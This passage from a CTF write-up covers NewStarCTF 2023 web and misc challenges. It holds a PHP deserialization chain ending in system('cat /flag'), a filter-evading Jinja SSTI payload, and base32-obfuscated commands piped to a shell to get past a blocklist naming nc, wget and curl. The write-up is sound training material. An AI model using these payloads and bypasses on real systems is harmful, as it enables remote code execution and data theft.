class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Super%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>obj%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Handle%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>obj%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>CTF%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>handle%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>WhiteGod%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>func%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>readfile%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>var%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>Fflag%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p>exp2:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <br>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>       <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">       </span>&#123;<br>       &#125;<br>   &#125;<br>    <br>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>       <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;     <br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)    </span><br><span class="hljs-function">       </span>&#123;     <br>           <span class="hljs-variable">$s</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Super</span>();    <br>           <span class="hljs-variable language_">$this</span>-&gt;func=<span class="hljs-variable">$s</span>;    <br>       &#125;    <br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>           (<span class="hljs-variable language_">$this</span>-&gt;func)();<span class="hljs-comment">//这里把Super当函数调用，实际触发了Super()里面的__invoke方法</span><br>           <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>       &#125;<br>   &#125; <br>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>       <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">       </span>&#123;<br>           <span class="hljs-variable language_">$this</span>-&gt;obj=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<span class="hljs-comment">//实例化CTF（）后给这里的obj赋值</span><br>       &#125;<br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)</span><br><span class="hljs-function">       </span>&#123;<br>           <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();<span class="hljs-comment">//调用了CTF（）里的end()方法</span><br>       &#125;<br>   &#125; <br>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>       <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">       </span>&#123;<br>           <span class="hljs-variable language_">$this</span>-&gt;obj=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Handle</span>();<span class="hljs-comment">//为protected $obj赋值</span><br>       &#125;<br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">       </span>&#123;<br>           <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();<span class="hljs-comment">//Handle 类没有定义 getStr() 方法，因此在调用这个方法时会触发 handle里的__call() 魔术方法</span><br>       &#125;<br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">       </span>&#123;<br>           <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;==GAME OVER==&quot;</span>);<br>       &#125;<br>   &#125;     <br>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>       <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;    <br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)     </span><br><span class="hljs-function">       </span>&#123;   <br>           <span class="hljs-variable">$w</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteGod</span>();    <br>           <span class="hljs-variable language_">$this</span>-&gt;handle=<span class="hljs-variable">$w</span>;<br>       &#125;<br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">       </span>&#123;<br>           <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);<span class="hljs-comment">//在这个end()方法中我们试图用unset（）删除WhiteGod()里面的log属性</span><br>       &#125;<br>   &#125;  <br>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>       <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>=<span class="hljs-string">&#x27;system&#x27;</span>;<br>       <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&quot;cat /flag&quot;</span>;  <br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">       </span>&#123;<br>           (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);    <br>       &#125;<br>   &#125;<br>   <span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>();<br>   <span class="hljs-variable">$b</span>-&gt;name=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Then</span>();<br>   <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));<br></code></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__destruct</span>() 中，由于 <span class="hljs-variable">$name</span> 包含一个 Then 对象，会触发 <span class="hljs-built_in">__toString</span>() 魔术方法。<br>在 <span class="hljs-built_in">__toString</span>() 方法中，首先调用 <span class="hljs-variable">$this</span>-&gt;func 属性指向的对象（即 Super 对象），<br>接下来进入 Super 类，由于该类含有一个 <span class="hljs-built_in">__invoke</span>() 魔术方法，因此在调用 Super 对象时会触发 <span class="hljs-built_in">__invoke</span>() 方法。<br>在 <span class="hljs-built_in">__invoke</span>() 方法中，又会调用 <span class="hljs-variable">$this</span>-&gt;obj-&gt;<span class="hljs-built_in">getStr</span>() 方法，并进入 Handle 类中。<br><br>由于 Handle 类没有定义 <span class="hljs-built_in">getStr</span>() 方法，因此在调用这个方法时会触发 <span class="hljs-built_in">__call</span>() 魔术方法。<br>在 <span class="hljs-built_in">__call</span>() 方法中，将会调用 <span class="hljs-variable">$this</span>-&gt;obj-&gt;<span class="hljs-built_in">end</span>() 方法，并触发 CTF 类中的 <span class="hljs-built_in">end</span>() 方法。<br><br>在 CTF 类的 <span class="hljs-built_in">end</span>() 方法中，我们会调用 <span class="hljs-built_in">unset</span>($this-&gt;handle-&gt;log)，<br>从而触发 WhiteGod 类的 <span class="hljs-built_in">__unset</span>() 魔术方法。<br>在 <span class="hljs-built_in">__unset</span>() 方法中，我们构造了一个命令行字符串，然后通过执行漏洞执行了系统命令。<br></code></pre></td></tr></table></figure><h3 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h3><p>Python的SSTI</p><p><img src="/2023/10/23/NewStarCTF2023/image-20231024140308292.png" alt="image-20231024140308292"></p><p>发现文件路径，使用name传参访问</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs perl">?name=&#123;&#123;<span class="hljs-number">7</span>*<span class="hljs-number">7</span>&#125;&#125;                              发现过滤了连续的&#123;&#123;&#125;&#125;<br>?name=&#123;%print(<span class="hljs-number">7</span>*<span class="hljs-number">7</span>)%&#125;                        出现<span class="hljs-number">49</span> 说明成功了 <br>我们看下config配置 看看key  没有，那考点应该不是爆破 查看一下子类<br>?name=&#123;%print<span class="hljs-string">&quot;&quot;</span>|attr(<span class="hljs-string">&quot;__class__&quot;</span>)|attr(<span class="hljs-string">&quot;__base__&quot;</span>)|attr(<span class="hljs-string">&quot;__subclasses__&quot;</span>)()%&#125;<br>查找到&lt;class <span class="hljs-string">&#x27;os._wrap_close&#x27;</span>&gt;在第[<span class="hljs-number">128</span>]个子类名<br>使用__init_<span class="hljs-number">_</span>方法再调用__globals_<span class="hljs-number">_</span>可以获取到方法内以字典的形式返回的方法、属性等值，但这里init被过滤我们采用<span class="hljs-string">&quot;+&quot;</span>进行绕过 即in<span class="hljs-string">&quot;+&quot;</span>it<br>?name=&#123;%print<span class="hljs-string">&quot;&quot;</span>|attr(<span class="hljs-string">&quot;__class__&quot;</span>)|attr(<span class="hljs-string">&quot;__base__&quot;</span>)|attr(<span class="hljs-string">&quot;__subclasses__&quot;</span>)()|attr(<span class="hljs-number">132</span>)|attr(<span class="hljs-string">&quot;__in&quot;</span>+<span class="hljs-string">&quot;it__&quot;</span>)|attr(<span class="hljs-string">&quot;__globals__&quot;</span>)%&#125;<br>找到了<span class="hljs-keyword">eval</span> 然后我们可按照下面这样来构造命令<br>popen被过滤 但是我们可用采用<span class="hljs-keyword">chr</span>编码进行绕过__import_<span class="hljs-number">_</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;ls /&#x27;</span>).read()进行<span class="hljs-keyword">chr</span>编码,<br>但我们还是要执行这个函数<span class="hljs-keyword">eval</span>(__import_<span class="hljs-number">_</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;ls /&#x27;</span>).read())<br>发现flag之后也是一样的改为__import_<span class="hljs-number">_</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;cat /flag&#x27;</span>).read() 进行<span class="hljs-keyword">chr</span>编码<br>?name=&#123;%print<span class="hljs-string">&quot;&quot;</span>|attr(<span class="hljs-string">&quot;__class__&quot;</span>)|attr(<span class="hljs-string">&quot;__base__&quot;</span>)|attr(<span class="hljs-string">&quot;__subclasses__&quot;</span>)()|attr(<span class="hljs-number">10</span>)|attr(<span class="hljs-string">&quot;__in&quot;</span>+<span class="hljs-string">&quot;it__&quot;</span>)|attr(<span class="hljs-string">&quot;__globals__&quot;</span>)|attr(<span class="hljs-string">&quot;get&quot;</span>)(<span class="hljs-string">&quot;__builtins__&quot;</span>)|attr(<span class="hljs-string">&quot;get&quot;</span>)(<span class="hljs-string">&quot;eval&quot;</span>)(<span class="hljs-string">&quot;eval(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41))&quot;</span>)%&#125;<br>flag&#123;<span class="hljs-number">50</span>febb8e-<span class="hljs-number">61</span>b<span class="hljs-number">0</span>-<span class="hljs-number">42</span>d6-bfc9-<span class="hljs-number">906243946038</span>&#125;<br></code></pre></td></tr></table></figure><p>官方wp：ban掉了一些内置函数但还剩下get_flashed_message()</p><p>直接<code>&#123;% print(get_flashed_messages.__globals__.os["pop"+"en"]("cat /flag").read()) %&#125;</code></p><h3 id="R-C-E-2"><a href="#R-C-E-2" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;code))&#123;<br>            <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;code);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;alright&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;qwejaskdjnlka;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]))&#123;<br>    <span class="hljs-comment">//wanna try?</span><br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>&#125;<br><span class="hljs-variable">$Minipop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$Minipop</span>-&gt;qwejaskdjnlka = <span class="hljs-variable">$Minipop</span>;<br><span class="hljs-variable">$Minipop</span>-&gt;code = <span class="hljs-string">&#x27;echo &quot;JJLEMRSDK5BUQR2KIJCUGUSTK5FUUSSVINJUWVKJJZDVKTKXKNMEWRSFKVCVIU2PJFLESVKJJZBUWS2KIFKU2TSLKRETKRSUJNKVGUKKGVFEMRKXINBEUUSOIZCVEMSGJRDEUVCJKRFVGS2OIVCUWV2DIVEVMR2WIVLUGR2MIZGVMSKUJNHEWSSJIVHVESZSJFJEIVJUKFJUESJVIFKE6UJSJZFFMRSFI46T2PI=&quot; | base32 -d | base32 -d |base32 -d |/bin/[r-t]h&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$Minipop</span>);<br></code></pre></td></tr></table></figure><p>因为对bash进行了过滤，所以用base32进行加密，正则匹配发现被匹配到了，于是多加密了两层</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;JJLEMRSDK5BUQR2KIJCUGUSTK5FUUSSVINJUWVKJJZDVKTKXKNMEWRSFKVCVIU2PJFLESVKJJZBUWS2KIFKU2TSLKRETKRSUJNKVGUKKGVFEMRKXINBEUUSOIZCVEMSGJRDEUVCJKRFVGS2OIVCUWV2DIVEVMR2WIVLUGR2MIZGVMSKUJNHEWSSJIVHVESZSJFJEIVJUKFJVOSKWIFLFGUSCKVFEUSSGIVJEWSSIKU3FIMSQJI2UQVJ5HU6T2PJ5&quot;</span> | <span class="hljs-built_in">base32</span> -d | <span class="hljs-built_in">base32</span> -d |<span class="hljs-built_in">base32</span> -d |/bin/[r-t]h<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload</span>=O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;minipop&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;code&quot;</span>;s:<span class="hljs-number">287</span>:<span class="hljs-string">&quot;echo &quot;</span>JJLEMRSDK5BUQR2KIJCUGUSTK5FUUSSVINJUWVKJJZDVKTKXKNMEWRSFKVCVIU2PJFLESVKJJZBUWS2KIFKU2TSLKRETKRSUJNKVGUKKGVFEMRKXINBEUUSOIZCVEMSGJRDEUVCJKRFVGS2OIVCUWV2DIVEVMR2WIVLUGR2MIZGVMSKUJNHEWSSJIVHVESZSJFJEIVJUKFJUESJVIFKE6UJSJZFFMRSFI46T2PI=<span class="hljs-string">&quot; | base32 -d | base32 -d |base32 -d |/bin/[r-t]h&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;qwejaskdjnlka&quot;</span>;r:<span class="hljs-number">1</span>;&#125;<br></code></pre></td></tr></table></figure><h2 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc"></a>Misc</h2><h3 id="阳光开朗大男孩"><a href="#阳光开朗大男孩" class="headerlink" title="阳光开朗大男孩"></a>阳光开朗大男孩</h3><p>secret.txt社会主义核心价值观编码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">法治自由公正爱国公正敬业法治和谐平等友善敬业法治富强公正民主法治和谐法治和谐法治法治公正友善敬业法治文明公正自由平等诚信平等公正敬业法治和谐平等友善敬业法治和谐和谐富强和谐富强和谐富强平等友善敬业公正爱国和谐自由法治文明公正自由平等友善敬业法治富强和谐自由法治和谐法治和谐法治和谐法治法治和谐富强法治文明公正自由公正自由公正自由公正自由<br></code></pre></td></tr></table></figure><p><code>得到this_password_is_s000_h4rd_p4sssw0rdddd</code></p><p>打开flag.txt</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">🙃💵🌿🎤🚪🌏🐎🥋🚫😆😍🌊⏩🔬🚹✉☀☺🚹🐅🎤🛩💵🌿🌊🚰😊🌊✉🐎❓🎈🌉👑🎅📮🥋👣🕹🚪☀🔄🚫🐍❓🐍😊☀🔬🍍🤣🎈🥋🙃👑🌏🐎🌊📮😂💵🏹👉❓😇🍴💧☺💵😁☃👉🎅👁☂🌿👉🍴🌪👌🍴🍵🖐😇🍍😀🗒🗒<br></code></pre></td></tr></table></figure><p>基于<code>AES-EMOJI</code>的原理其实就是一个换表base64然后加个ECB模式的AES，把原来base64的64个字符加个&#x3D;号一共65个字符替换成65个emoji字符</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> string<br>emojisInit=<span class="hljs-string">&quot;🍎🍌🏎🚪👁👣😀🖐ℹ😂🥋✉🚹🌉👌🍍👑👉🎤🚰☂🐍💧✖☀🦓🏹🎈😎🎅🐘🌿🌏🌪☃🍵🍴🚨📮🕹📂🛩⌨🔄🔬🐅🙃🐎🌊🚫❓⏩😁😆💵🤣☺😊😇😡🎃😍✅🔪🗒&quot;</span><br>alpha = string.ascii_lowercase+string.ascii_uppercase+string.digits+<span class="hljs-string">&quot;+/=&quot;</span><br>cipher = <span class="hljs-string">&quot;🙃💵🌿🎤🚪🌏🐎🥋🚫😆😍🌊⏩🔬🚹✉☀☺🚹🐅🎤🛩💵🌿🌊🚰😊🌊✉🐎❓🎈🌉👑🎅📮🥋👣🕹🚪☀🔄🚫🐍❓🐍😊☀🔬🍍🤣🎈🥋🙃👑🌏🐎🌊📮😂💵🏹👉❓😇🍴💧☺💵😁☃👉🎅👁☂🌿👉🍴🌪👌🍴🍵🖐😇🍍😀🗒🗒&quot;</span><br>base64data = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cipher:<br>    base64data += alpha[emojisInit.index(i)]<br><span class="hljs-built_in">print</span>(base64data)<br><span class="hljs-comment">#U2FsdGVkX19WZSmly4mTsP2FWt5WlVYBnqDMkfNdyRXvYv5ySp3BkUqGVWMj2ArY6Kw420IrDeuFrKHoKJh6pg==</span><br></code></pre></td></tr></table></figure><p>AES解密,key是<code>s000_h4rd_p4sssw0rdddd</code></p><p><img src="/2023/10/23/NewStarCTF2023/week3_misc1.png" alt="week3_misc1"></p><h3 id="滴滴滴"><a href="#滴滴滴" class="headerlink" title="滴滴滴"></a>滴滴滴</h3><p>wav文件听起来像是拨号音，在<a href="http://dialabc.com/sound/detect/index.html?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTc5ODYxNzksImZpbGVHVUlEIjoiUVBNUnh6R2t0enNabnpoeiIsImlhdCI6MTY5Nzk4NTg3OSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMyNzcwOTUzNX0.0JH7aNpFHXnhVV3SMs15dRFcDbFI7Z9AvJeAT_FSWeM">http://dialabc.com/sound/detect/index.html</a> 进行拨号音识别：</p><p><img src="/2023/10/23/NewStarCTF2023/1697987581079.png" alt="1697987581079"></p><p>得到拨号音的内容为：</p><p>52563319066</p><p>结合题目简介的提示，这串数字应该是某处使用的密码，因此可以尝试steghide工具来对jpg图片进行隐写内容提取：</p><p><code>steghide extract -sf secret.jpg</code> </p><p>得到fffflllllaaaaaggggg.txt</p><p><code>flag&#123;1nf0rm4t10n_s3cur1ty_1s_a_g00d_j0b_94e0308b&#125;</code></p><h3 id="大怨种"><a href="#大怨种" class="headerlink" title="大怨种"></a>大怨种</h3><p>给了一个gif，gifframe查看</p><p>第二张含有一张汉信码，在线解密<a href="https://tuzim.net/hxdecode/">在线汉信码识别,汉信码解码 - 兔子二维码 (tuzim.net)</a></p><p><img src="/2023/10/23/NewStarCTF2023/week3_misc2.png" alt="week3_misc2"></p><p><code>flag&#123;1_d0nt_k0nw_h0w_to_sc4n_th1s_c0d3_acef808a868e&#125;</code></p><h3 id="键盘侠"><a href="#键盘侠" class="headerlink" title="键盘侠"></a>键盘侠</h3><p>usb流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r draobyek.pcapng -Y <span class="hljs-string">&#x27;usb.data_len == 8&#x27;</span> -Y <span class="hljs-string">&#x27;usb.src ==&quot;1.15.1&quot;&#x27;</span> -T fields -e usbhid.data | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; draobyek1.txt<br></code></pre></td></tr></table></figure><p>得到（其中<DEL>表示删除，<SPACE>表示空格，根据这个按键顺序对数据进行处理后得到flag）</SPACE></DEL></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 